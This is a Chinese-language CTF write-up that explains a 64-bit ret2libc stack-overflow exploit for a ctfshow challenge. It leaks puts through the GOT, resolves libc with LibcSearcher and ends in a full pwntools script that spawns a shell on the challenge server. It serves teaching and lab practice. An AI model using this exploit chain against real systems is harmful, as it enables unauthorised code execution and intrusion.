# 挑战简介
64位 无 system 无 "/bin/sh"

# 思路
64位的retlibc，唯一要注意的可能是栈对齐  

必须再解释一遍ret2libc的意思
```
ret2libc是一种常见的栈溢出利用技术。当程序存在栈溢出漏洞，但没有开启NX（No-eXecute，禁止执行栈上数据）保护时，可以直接写入shellcode到栈上并执行。
但如果NX开启了，我们就不能直接执行栈上的代码。ret2libc的思想是：虽然不能直接执行我们写入的代码，但程序加载的共享库（如libc.so）中包含了大量现成的函数
（如system, execve等）。我们可以通过覆盖返回地址，让程序跳转到libc库中的system函数，并设法将参数（如"/bin/sh"字符串的地址）传递给它，从而间接执行我们想要的命令。
```

## 计算偏移量和寻找Gadgets/地址:
```

offset = 0x70 + 0x8

rdi_addr = 0x400803

ret_addr = 0x4004fe

vuln = elf.symbols['ctfshow']

puts_plt = elf.plt['puts']

puts_got = elf.got['puts']
```

offset = 0x70 + 0x8: 这是栈溢出的偏移量。通常通过调试（如GDB）或模式字符串（如cyclic）找到。0x70可能是局部缓冲区的大小，+ 0x8通常是覆盖保存的RBP（64位下占8字节），
之后紧接着就是返回地址。

rdi_addr = 0x400803: 这是ROP Gadget pop rdi; ret 的地址。在64位Linux下，函数的第一个参数通过RDI寄存器传递。这个gadget的作用是：
从栈顶弹出一个值放入RDI寄存器，然后执行ret（再从栈顶弹出一个地址并跳转）。我们用它来设置即将调用的函数的参数。
这个地址通常用ROPgadget或ropper等工具在目标程序或其加载的库中寻找。

ret_addr = 0x4004fe: 这是一个简单的 ret 指令的地址。有时用于栈对齐（特别是调用system等libc函数前，要求栈地址按16字节对齐），
或者仅仅是为了在ROP链中进行一次简单的跳转。

vuln = elf.symbols['ctfshow']: 获取程序中名为ctfshow的函数的地址。这很可能是存在栈溢出漏洞的函数。我们在第一次溢出后需要返回到这里，以便进行第二次溢出。

puts_plt = elf.plt['puts']: 获取puts函数在PLT（Procedure Linkage Table，过程链接表）中的地址。调用puts@plt会（在第一次调用时）
触发动态链接器去解析puts的真实地址并填入GOT表，然后跳转到真实的puts函数。

puts_got = elf.got['puts']: 获取puts函数在GOT（Global Offset Table，全局偏移表）中的地址。GOT表存储的是外部函数在内存中的实际地址。
在程序第一次调用某个外部函数前，GOT表里可能存的是PLT中用于解析的代码地址；解析后，这里会填上该函数在libc中的真实地址。我们的目标就是读取这个GOT表项，
泄露出puts在内存中的真实地址。

---

## 第一次Payload - 泄露puts的真实地址:
```
payload = b'a'*offset + p64(rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(vuln)
p.sendline(payload)

puts_real = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
# 64位的libc共享库字节常是"\x7f"  ,32位的是"\xf7"
#然后将这个8字节的序列转换为一个64位无符号整数。
```
b'a'*offset: 填充物，覆盖缓冲区和保存的RBP，到达返回地址的位置。

p64(rdi_addr): 覆盖返回地址为 pop rdi; ret gadget。

p64(puts_got): 这是 pop rdi 指令要弹出的值。执行 pop rdi 后，RDI 寄存器的值将是 puts 函数在GOT表中的地址 (puts_got)。

p64(puts_plt): 这是 pop rdi; ret 中的 ret 指令要跳转到的地址。此时RDI指向puts_got，所以这相当于调用 puts(puts_got)。puts函数会打印出puts_got地址处存储的内容，
也就是puts函数在libc中的真实地址。

p64(vuln): 这是 puts 函数执行完后要返回的地址。我们让它返回到存在漏洞的函数 (ctfshow) 的开头，这样程序流会再次执行到read或gets等输入函数，等待我们发送第二次payload。

p.recvuntil(b'\x7f'): 持续接收数据，直到遇到字节\x7f。在64位Linux系统中，libc库加载的地址通常以0x7f开头（虽然不是绝对的，但很常见），所以用它作为接收地址的标志。

[-6:]: 取接收到的数据的最后6个字节。因为地址通常是0x7fxxxxxxxxxx，我们只需要后面的字节。puts打印地址时可能不会打印前面的0x00字节，所以只取有效的低位字节。

.ljust(8, b'\x00'): 将得到的6字节数据向左对齐，并在右边填充空字节 (\x00)，使其总长度达到8字节（64位地址长度）。

u64(...): 将这8字节的数据解包成一个64位无符号整数，这就是泄露出的puts函数在内存中的真实地址。

## 利用LibcSearcher计算所需地址:
```
libc = LibcSearcher('puts',puts_real)

libc_base = puts_real - libc.dump('puts')

bin_sh = libc_base + libc.dump('str_bin_sh')

sys_addr = libc_base + libc.dump('system')
```

libc = LibcSearcher('puts', puts_real): 创建一个LibcSearcher对象。我们告诉它，我们泄露了名为'puts'的函数，其真实地址是puts_real。
LibcSearcher会查询它的数据库，找到哪个（或哪些）已知的libc版本中，puts函数的偏移量与我们计算出的puts_real地址的低位匹配。

libc_base = puts_real - libc.dump('puts'): 计算libc库在内存中的基地址。原理是：函数真实地址 = libc基地址 + 函数在libc文件中的偏移量。
所以 libc基地址 = 函数真实地址 - 函数偏移量。libc.dump('puts')就是从LibcSearcher找到的匹配libc版本中获取puts函数的偏移量。

bin_sh = libc_base + libc.dump('str_bin_sh'): 计算libc中字符串"/bin/sh"的实际内存地址。libc.dump('str_bin_sh')获取该字符串在libc文件中的偏移量。

sys_addr = libc_base + libc.dump('system'): 计算libc中system函数的实际内存地址。libc.dump('system')获取system函数在libc文件中的偏移量。

## 第二次Payload - 执行system("/bin/sh"):
```
payload = b'a'*offset + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)
```
p64(ret_addr): 第一个覆盖的返回地址是 ret gadget。这主要是为了栈对齐，因为调用system通常需要栈是16字节对齐的。
执行这个ret会消耗掉栈上的这个地址，然后继续执行栈上的下一个地址（rdi_addr）。

p64(rdi_addr): 接下来是 pop rdi; ret gadget。

p64(bin_sh): 这是 pop rdi 要弹出的值，即我们计算出的 "/bin/sh" 字符串的内存地址。执行 pop rdi 后，RDI = bin_sh。

p64(sys_addr): 这是 pop rdi; ret 中的 ret 要跳转到的地址，即我们计算出的 system 函数的内存地址。此时RDI是"/bin/sh"的地址，所以这相当于调用 system("/bin/sh")。

---
最终EXP
```
#!/usr/bin/python3

from pwn import *
from LibcSearcher import *
context.log_level = "debug"

p= remote("pwn.challenge.ctf.show",28223)
elf = ELF('./pwn')

offset = 0x70 + 0x8

rdi_addr = 0x400803

ret_addr = 0x4004fe

vuln = elf.symbols['ctfshow']

puts_plt = elf.plt['puts']

puts_got = elf.got['puts']

payload = b'a'*offset + p64(rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(vuln)
p.sendline(payload)

puts_real = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
# 64位的libc共享库字节常是"\x7f"  ,32位的是"\xf7"
#然后将这个8字节的序列转换为一个64位无符号整数。

libc = LibcSearcher('puts',puts_real)

libc_base = puts_real - libc.dump('puts')

bin_sh = libc_base + libc.dump('str_bin_sh')

sys_addr = libc_base + libc.dump('system')

payload = b'a'*offset + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)

print(payload)

p.sendline(payload)

p.interactive()

```
